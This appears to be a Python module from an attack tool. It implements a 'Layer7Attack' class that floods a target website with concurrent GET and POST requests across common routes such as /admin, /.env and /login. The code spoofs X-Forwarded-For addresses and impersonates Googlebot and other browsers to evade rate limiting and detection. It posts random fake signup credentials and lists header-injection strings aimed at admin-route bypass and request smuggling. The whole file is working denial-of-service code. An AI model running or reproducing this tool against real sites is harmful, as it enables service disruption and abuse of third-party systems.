import asyncio
import random
import string
from typing import Any, Optional

import aiohttp
import structlog

from attack.base import BaseAttacker

logger = structlog.get_logger(__name__)

COMMON_ROUTES = ["/", "/api/v1/", "/login", "/signup", "/search", "/profile", "/admin", "/wp-admin", "/.env", "/api/users", "/graphql"]
HEADERS_INJECTION = [
    "X-Forwarded-For: 127.0.0.1",
    "X-Original-URL: /admin",
    "X-Rewrite-URL: /admin",
    "Content-Length: 0",
    "Transfer-Encoding: chunked",
]


class Layer7Attack(BaseAttacker):
    name = "layer7"
    description = "Layer 7 application-layer attack simulating real user behavior patterns"

    async def run(
        self,
        target: str,
        concurrent: int = 100,
        rate: int = 50,
        routes: Optional[list] = None,
        do_post: bool = True,
        random_params: bool = True,
        **kwargs: Any,
    ) -> None:
        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        routes = routes or COMMON_ROUTES
        connector = aiohttp.TCPConnector(limit=concurrent, force_close=True)
        client = aiohttp.ClientSession(connector=connector)

        def random_body() -> dict:
            return {
                "username": "".join(random.choices(string.ascii_lowercase, k=8)),
                "password": "".join(random.choices(string.ascii_letters + string.digits, k=12)),
                "email": f"{''.join(random.choices(string.ascii_lowercase, k=6))}@gmail.com",
            }

        def random_headers() -> dict:
            h = {"User-Agent": random.choice([
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            ])}
            if random.random() < 0.3:
                h["X-Forwarded-For"] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
            if random.random() < 0.1:
                h["X-Requested-With"] = "XMLHttpRequest"
            if random.random() < 0.1:
                h["Content-Type"] = random.choice(["application/json", "application/x-www-form-urlencoded", "multipart/form-data"])
            return h

        sem = asyncio.Semaphore(concurrent)
        delay = 1.0 / rate if rate > 0 else 0

        async def simulate_user() -> None:
            while not self.session.is_stopped:
                await self.session._pause_event.wait()
                async with sem:
                    try:
                        route = random.choice(routes)
                        url = target.rstrip("/") + route
                        headers = random_headers()

                        if do_post and random.random() < 0.3:
                            async with client.post(url, json=random_body(), headers=headers) as resp:
                                await resp.read()
                        else:
                            if random_params and "?" not in route:
                                params = {"q": "".join(random.choices(string.ascii_lowercase, k=6)), "t": str(random.randint(1, 99999))}
                                url += "?" + "&".join(f"{k}={v}" for k, v in params.items())
                            async with client.get(url, headers=headers) as resp:
                                await resp.read()

                        self.session.stats.packets_sent += 1
                        self.session.stats.bytes_sent += 500
                    except Exception:
                        self.session.stats.errors += 1
                    await asyncio.sleep(delay)

        tasks = [asyncio.create_task(simulate_user()) for _ in range(concurrent)]

        try:
            await self.session.wait_for_stop()
        finally:
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            await client.close()
